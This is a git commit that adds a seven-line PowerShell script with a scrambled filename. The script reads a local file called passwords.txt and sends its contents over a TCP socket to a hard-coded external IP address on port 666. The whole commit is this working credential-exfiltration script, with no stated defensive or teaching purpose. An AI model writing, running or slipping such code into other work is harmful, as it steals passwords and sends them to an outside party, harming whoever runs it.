c467d3fd677e83fa5ecb2e42cdccddc6f74bdc25
Savitar407 <42724977+Savitar407@users.noreply.github.com>
2021-02-21 17:54:03 -0500

    Create (#&$^#$^.ps1

---
+++ (#&$^#$^.ps1
@@ -0,0 +1,7 @@
+$port=666
+$remoteHost = "209.151.149.234"
+$message = type passwords.txt
+$socket = new-object System.Net.Sockets.TcpClient($remoteHost, $port)
+$data = [System.Text.Encoding]::ASCII.GetBytes($message)
+$stream = $socket.GetStream()
+$stream.Write($data, 0, $data.Length)
